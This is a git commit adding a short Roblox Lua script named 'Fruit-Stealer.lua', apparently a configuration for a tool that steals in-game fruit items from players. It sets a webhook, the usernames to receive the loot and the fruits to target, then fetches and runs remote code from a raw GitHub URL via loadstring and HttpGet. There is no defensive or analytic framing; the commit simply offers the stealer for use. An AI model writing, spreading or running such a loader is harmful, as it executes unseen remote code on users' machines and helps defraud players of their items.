6f2ad6e1d751e294c2b3ad129e5d97af03a4818d
uAreNobb <yashskelkar@gmail.com>
2025-04-10 05:54:02 +0530

    Create Fruit-Stealer.lua

---
+++ Fruit-Stealer.lua
@@ -0,0 +1,5 @@
+Webhook = "" -- << Your Webhook
+Usernames = {"YSKTABAHI", "XR_TABAHIXD"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
